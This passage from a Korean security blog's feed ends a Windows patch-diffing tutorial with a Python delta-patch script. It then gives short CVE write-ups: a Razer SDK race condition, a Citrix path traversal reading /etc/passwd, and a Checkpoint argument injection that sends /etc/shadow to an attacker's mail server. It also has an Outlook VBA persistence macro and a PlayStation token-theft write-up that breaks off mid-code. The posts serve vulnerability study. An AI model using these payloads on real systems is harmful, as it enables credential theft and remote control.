class="hljs-number">0x00000000</span>DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="hljs-number">0x00000001</span><span class="hljs-comment"># struct</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_INPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U1</span>(<span class="hljs-params">Union</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpcStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID)]_anonymous_ = (<span class="hljs-string">&#x27;u1&#x27;</span>,)_fields_ = [(<span class="hljs-string">&#x27;u1&#x27;</span>, U1),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t),(<span class="hljs-string">&#x27;Editable&#x27;</span>, wintypes.BOOL)]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_OUTPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t)]ApplyDeltaB = windll.msdelta.ApplyDeltaBApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT,                        POINTER(DELTA_OUTPUT)]ApplyDeltaB.rettype = wintypes.BOOLDeltaFree = windll.msdelta.DeltaFreeDeltaFree.argtypes = [wintypes.LPVOID]DeltaFree.rettype = wintypes.BOOLgle = windll.kernel32.GetLastError<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">apply_patches</span>(<span class="hljs-params">buf, buf_len, patch_path</span>):</span><span class="hljs-keyword">with</span> open(patch_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> p:patch = p.read()<span class="hljs-keyword">if</span> patch[:<span class="hljs-number">2</span>] != <span class="hljs-string">b&quot;PA&quot;</span>:patch_offset = patch.find(<span class="hljs-string">b&quot;PA&quot;</span>)<span class="hljs-keyword">if</span> patch_offset != <span class="hljs-number">4</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Invalid Patch&quot;</span>)<span class="hljs-comment"># Check CRC</span>crc = int.from_bytes(patch[:<span class="hljs-number">4</span>], byteorder = <span class="hljs-string">&quot;little&quot;</span>)patch_contents = patch[<span class="hljs-number">4</span>:]<span class="hljs-keyword">if</span> zlib.crc32(patch_contents) != crc:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;CRC check failed&quot;</span>)flag = DELTA_FLAG_NONEd_dest = DELTA_INPUT()d_src = DELTA_INPUT()d_out = DELTA_OUTPUT()d_src.lpcStart = bufd_src.uSize = buf_lend_src.Editable = <span class="hljs-literal">False</span>d_dest.lpcStart = cast(patch_contents, wintypes.LPVOID)d_dest.uSize = len(patch_contents)d_dest.Editable = <span class="hljs-literal">False</span>status = ApplyDeltaB(flag, d_src, d_dest, byref(d_out))<span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Patch &quot;</span>+ patch_path + <span class="hljs-string">&quot; failed with Error code &quot;</span>+str(gle()))<span class="hljs-keyword">return</span> (d_out.lpStart, d_out.uSize)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:ap = argparse.ArgumentParser()mode = ap.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)mode.add_argument(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;--input&quot;</span>, help=<span class="hljs-string">&quot;revese/forward diff file path&quot;</span>)mode.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--null&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, default=<span class="hljs-literal">False</span>, help=<span class="hljs-string">&quot;Create file from null diff&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, required=<span class="hljs-literal">True</span> , help=<span class="hljs-string">&quot;write patched file&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--patches&quot;</span>, required=<span class="hljs-literal">True</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, help=<span class="hljs-string">&quot;Patches path to apply&quot;</span>)args = ap.parse_args()<span class="hljs-keyword">with</span> open(args.input, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> r:inbuf = r.read()buf_len = len(inbuf)buf = cast(inbuf, wintypes.LPVOID) <span class="hljs-comment"># cast to void * pointer</span>alloc_list = []<span class="hljs-keyword">for</span> patch <span class="hljs-keyword">in</span> args.patches:buf, buf_len = apply_patches(buf, buf_len, patch)alloc_list.append(buf)output_buf = bytes((c_ubyte*buf_len).from_address(buf))<span class="hljs-keyword">with</span> open(args.output, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> w:w.write(output_buf)<span class="hljs-keyword">for</span> alloc <span class="hljs-keyword">in</span> alloc_list:DeltaFree(alloc)hash = hashlib.sha256(output_buf)print(str(len(args.patches)) + <span class="hljs-string">&quot; pathces successfully applied.&quot;</span>)print(<span class="hljs-string">&quot;hash : &quot;</span> + base64.b64encode(hash.digest()).decode())</code></pre><p>옵션 별 기능은 다음과 같습니다.</p><p>-i :  reverse 또는 forward differential 패치 할 바이너리 지정</p><p>-n : null differential</p><p>-o : 패치 된 결과 파일 생성</p><p>-p : 패치 diff파일 지정</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\ntoskrnl.exe ^<span class="hljs-literal">-o</span> result_ntoskrnl.exe <span class="hljs-literal">-p</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\r\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/3.png"></p><p>1082 버전의 <code>ntoskrnl.exe</code>를 같은 버전의 reverse diff 파일로 패치해 기본 버전으로 롤백한 결과입니다.</p><p>사진과 같이 successfully applied 메시지와 hash 값이 뜨면 패치가 정상적으로 이루어진 것을 확인할 있어요.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/4.png"></p><p>속성에서 확인해 보면 10.0.18362.1 기본 버전으로 롤백이 잘 됐네요!</p><p>이제 우리가 업데이트 패키지에서 추출한 <code>ntoskrnl</code>의 1016버전 forward diff로 패치를 해보겠습니다</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> result_ntoskrnl.exe <span class="hljs-literal">-o</span> ntoskrnl_1016.exe ^<span class="hljs-literal">-p</span> [<span class="hljs-type">EXTRACTED</span> <span class="hljs-type">PATH</span>]\\amd64_microsoft...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1016</span>...\\f\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/5.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/6.png"></p><p>버전은 1016으로 잘 올라간 것 같군요. hash도 비교해보죠.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/7.png"></p><p>JUNK의 ntoskrnl manifest에서 참고한 hash도 일치하네요! 이로써 패치 스크립트로 정상적으로 패치 된 것을 확인할 수 있습니다.</p><h1 id="Binary-Diffing"><a href="#Binary-Diffing" class="headerlink" title="Binary Diffing"></a>Binary Diffing</h1><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/8.png"></p><p>(글을 쓰고 있는 지금 내 상태)</p><p>바이너리 패치가 이렇게 힘들 일인가..? 격하게 아무것도 안하고 싶어졌지만 기왕 쓰기 시작한 거 끝은 봐야 하지 않겠습니까 으아악 빨리 끝내고 술 먹으러 가야지</p><p>마지막! diffing tool과 분석 방법입니다.</p><p>Diffing은 IDA에서 진행하며 BinDiff라는 플러그인을 사용합니다.  BinDiff는 무료로 배포되는 코드 분석 IDA 플러그인입니다. 유명한 만큼 성능 하나는 확실한 친구죠?</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/9.png"></p><p>BinDiff는 아래 링크에서 설치할 수 있습니다.</p><p><a href="https://www.zynamics.com/software.html">zynamics.com - Software</a></p><blockquote><p>IDA 7.2, BinDiff 5(BinExport 10)에서 진행했습니다.</p></blockquote><p>IDA가 설치된 경로를 입력하고 설치하면 되며 정상적으로 설치가 되었다면 IDA의 Edit → Plugins에서 BinDiff를 보실 수 있습니다.</p><p>우선 1016, 1082를 각각 을 열고 Edit→Plugins→BinExport10을 실행합니다.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/10.png"></p><p>그리고 BinExport v2 Binary Export로 각각 Export 해주면 준비는 끝!</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/11.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/12.png"></p><p>이제 BinDiff를 실행해서 Workspace를 만들고 Diff→New Diff에서 Export 한 두 바이너리를 선택합니다.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/13.png"></p><p>Export한 파일을 선택하고 Diff하면..!</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/14.png"></p><p>이렇게 Overview를 볼 수 있습니다. Similarity는 유사도를 나타내는데, 1에 가까울수록 차이가 없다는 뜻입니다.</p></br><p>아래로 내려보면 Similarity가 낮은 항목을 볼 수 있는데, 이 중 한 항목을 우클릭→Open Flow Graph를 실행하면</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/15.png"></p><p>이렇게 그래프로 보여줍니다.  각 노드 색별 의미는 다음과 같습니다.</p><p>초록색 - 변경점 없음</p><p>노란색 - 변경점 있음</p><p>빨간색  - 패치에 의해 제거됨</p><p>회색 - 패치에 의해 추가됨</p><p>좀 더 자세히 볼까요? 보려는 노드를 선택해보겠습니다.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/16.png"></p><p>이렇게 어셈블리 코드까지 볼 수 있습니다. 이런 방식으로 변경점을 트레이싱하면 어떤 부분이 패치되었는지 자세히 볼 수 있겠죠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며.."></a>마치며..</h1><p>패치 스크립트를 만들어 뒀으니 원데이 분석할 때 유용하게 쓸 수 있을 것 같네요 ㅎㅎ 이제 취약점.. 취약점만 찾으면 되는데….</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/17.png"></p><blockquote><p>아마 안될거야..</p></blockquote><p>다음엔 다른 주제로 찾아오겠습니다. 조금만 놀구요 ㅎ (<em>망할 코로나 얼른 꺼져줬으면 ^^!)</em></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/diffing/">diffing</category>
      
      <category domain="https://hackyboiz.github.io/tags/patch-tuesday/">patch tuesday</category>
      
      <category domain="https://hackyboiz.github.io/tags/patch-extract/">patch extract</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/29/l0ch/windows-patch-diffing-part2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
      <link>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/</link>
      <guid>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/</guid>
      <pubDate>Sat, 28 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.angelystor.com/2020/09/cve-2020-16602-remote-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer Chroma는 Razer사의 게이밍용 컴퓨터 주변기기들의 RGB 효과를 제어하는 플러그인으로 Razer synapse 설치 시 자동으로 설치됩니다. SDK가 존재해서 third party가 Razer Chroma와 연동되는 기능을 만들 수 있습니다. </p><p>예 ) Razer 제품과 RGB효과를 동기화하는 케이스, 음악에 맞춰 Razer 제품의 RGB를 변화시키는 음악 스트리밍 서비스 </p><p>Razer Chroma SDK Rest server는 Razer Chroma를 사용하는 컴퓨터에서 동작하고 있으며 모든 네트워크 인터페이스와 bind 해 54236번 포트로 listen 합니다. <code>http://localhost:54235/razer/chromasdk</code> 혹은<code> https://chromasdk.io:54236/razer/chromasdk</code> URI로 App info를 담은 POST request를 받으면 그 App info에 따라 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 실행파일을 생성하고 실행합니다.</p><p>몇 가지 이슈로 인해 race-condition을 이용한 arbitrary code execution이 가능합니다.</p><ol><li><p>해커는 Razer Chroma SDK Rest server가 동작하는 컴퓨터(이하 victim)의 IP주소만 알면 원격으로 POST request를 보내 임의의 파일명을 갖는 실행파일을 victim에 생성할 수 있습니다.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&#x27;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol start="2"><li>POST request를 받아 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 생성한 실행파일은 Admin권한이 있는 유저만 수정할 수 있습니다. 하지만 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더는 Admin 권한이 없어도 수정이 가능합니다.</li></ol><ol start="3"><li>POST request로 생성할 실행파일(test.exe)과 동일한 이름의 파일이 이미 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더 안에 존재하면 Razer Chroma SDK Rest server는 기존 파일의 내용을 덮어씁니다. 하지만 그 실행파일의 권한은 그 파일이 실행되기 전까진 수정하지 않으므로, 해커는 race-condition으로 test.exe의 내용을 수정해  arbitrary code execution을 할 수 있습니다.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/razer/">razer</category>
      
      <category domain="https://hackyboiz.github.io/tags/chroma/">chroma</category>
      
      <category domain="https://hackyboiz.github.io/tags/race-condition/">race condition</category>
      
      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
      <link>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/</link>
      <guid>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/</guid>
      <pubDate>Fri, 27 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/path-traversal-on-citrix-xen</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>조직 구성원들의 모바일 디바이스 및 애플리케이션을 관리하는 Endpoint Management 솔루션인 XenMobile에서 path traversal로 권한이 없는 사용자가 패스워드를 포함한 임의 파일을 읽을 수 있고, 암호화된 패스워드를 복호화 할 수 있는 취약점이 발견되었습니다.</p><p><code>help-sb-download.jsp</code> 에 존재하는 취약한 코드는 아래와 같습니다.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&#x27;&quot;&#x27;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>))&#123;outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    &#125;    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>매개변수로 받는 <code>sbFileName</code>은 <code>sbFilePath</code>의 <code>/op/sas/support/</code> 뒤에 연결되고 File 클래스 생성자의 인수가 됩니다. <code>sbFileName</code>에 <code>../../../etc/passwd</code>를 전달하면 <code>/etc/passwd</code>의 내용을 출력할 수 있습니다.</p><p>이를 이용해 암호화된 패스워드의 복호화도 가능합니다. 패스워드 암호화는 <code>/opt/sas/sw/lib/libsecure.so</code> 와 <code>DataSecurity.jar</code> 라이브러리에서 이루어지며  <code>/opt/sas/rt/keys/security.properties</code>에는 암호화 키가 존재합니다. 해커가 path traversal 취약점을 악용해 라이브러리와 key를 다운로드하고 로컬 환경에서 암호화 라이브러리를 import 해 패스워드를 복호화할 수 있습니다.</p><p>이 취약점은 <code>help-sb-download.jsp</code> 파일을 제거하는 것으로 패치가 이루어졌습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-download/">arbitrary file download</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-6020: Checkpoint ICA Management Tool에서 발견된 취약점 2가지</title>
      <link>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/</link>
      <guid>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/</guid>
      <pubDate>Thu, 26 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/vulnerabilities-in-checkpoin</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management의 ICA(Internal Certificate Authority) Management Tool에서 Argument Injection과 Denial of Service 취약점이 발견되었습니다. ICA Management Tool은 기본적으로 비활성화되어있으며 <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>로 활성화할 수 있으며 설정이 활성화되면 http://<smartcenter_ip>:18265/를 통해 접근할 수 있습니다. <code>cpca_client set_mgmt_tool on -no_ssl</code>을 통해 활성화할 시 인증 없이 해당 서비스에 접근이 가능하며 Manage Certificates에 접속했을 때 관리자인지 별도의 확인을 진행하지 않습니다.</p><p>ICA Management Tool에서 메일을 보내는 프로세스인 cpca는 sendmail 바이너리를 통하여 메일을 전송합니다. sendmail은 파일 전송 기능을 지원하지만 메일을 보낼 때 누가 보내는지 확인을 하지 않으며 최고 권한으로 실행되므로 모든 파일에 접근이 가능합니다. 따라서 인자로 파일 이름을 넘겨주면 해커의 메일 서버로 파일을 전송할 수 있습니다. </p><p>해커가 netcat 등을 통해 서버를 연 후 Configure the CA의 “Management Tool mail server”에 <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>를 입력하면 해커의 메일 서버에 <code>/etc/shadow</code> 파일 내용이 메일 형식으로 날아오게 됩니다.</p><p>Denial of Service의 경우 입력 값에 대한 유효성 검사 실패로 인해 발생합니다. 원격 클라이언트가 다음과 같은 형식으로 POST request를 보낼 경우 프로그램이 종료됩니다.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
      
      <category domain="https://hackyboiz.github.io/tags/argument-injection/">argument injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/checkpoint/">checkpoint</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Outlook Mail based Persistence access</title>
      <link>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/</link>
      <guid>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/</guid>
      <pubDate>Wed, 25 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-b</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook은 Microsoft Office의 이메일 클라이언트로 일정 관리, 연락처 관리, 일지 등의 다양한 기능을 제공합니다. 그중 다른 Office 제품들과 마찬가지로 Outlook은 VBA(Visaul Basic for Application) 기반 매크로를 만들어 사용하는 기능이 있고, 해커는 이를 악용해 persistence access를 얻을 수 있습니다.</p><p>Persistence access란 해커가 victim에 initial access를 획득한 이후에도 지속적으로 access 할 수 있는 상태입니다. 특정 제목의 이메일이 도착하면 트리거 되는 악성 매크로를 victim에 심어놓으면 해커는 단순히 이메일을 보내는 것만으로 원격 제어할 수 있습니다.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems &#x3D; Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item &#x3D; Nothing    Set olMailItem &#x3D; NothingEnd Sub</code></pre><p>위 POC 코드는 calc.exe를 실행하는 VBA 매크로입니다. 우선 Outlook이 실행됐을 때의 수신 메일함 상태를 저장합니다. 이후에 새로운 이메일이 추가되면 그 이메일의 제목을 확인하고, 만약 그 제목이 “MDSec”이라면 calc.exe를 실행한 후 해당 이메일을 삭제합니다.</p><p>이메일의 제목뿐만 아니라 발신 주소 혹은 내용 등으로 매크로의 트리거 조건을 다양하게 설정할 수 있고, calc.exe 대신 리버스 쉘을 실행하면 해커가 원격 제어를 할 수 있게 됩니다. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/outlook/">outlook</category>
      
      <category domain="https://hackyboiz.github.io/tags/email/">email</category>
      
      <category domain="https://hackyboiz.github.io/tags/persistence-access/">persistence access</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Access token stealing in playstation</title>
      <link>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/</link>
      <guid>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/</guid>
      <pubDate>Tue, 24 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/821896&quot;&gt;Access token steali</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com/">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>콘솔 게임기기인 PlayStation의 커뮤니티 <a href="https://my.playstation.com/auth/response.html%EC%97%90%EC%84%9C">https://my.playstation.com/auth/response.html에서</a> 로그인된 사용자의 Access Token을 탈취할 수 있는 취약점이 발견되었습니다.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> 페이지는 발급 서버에서 클라이언트로 OAuth 액세스 토큰을 전송하는 자바스크립트를 호스팅 합니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e&#125;....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) &#123;...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    &#125;&#125;<span class="hljs-keyword">var</span> response = 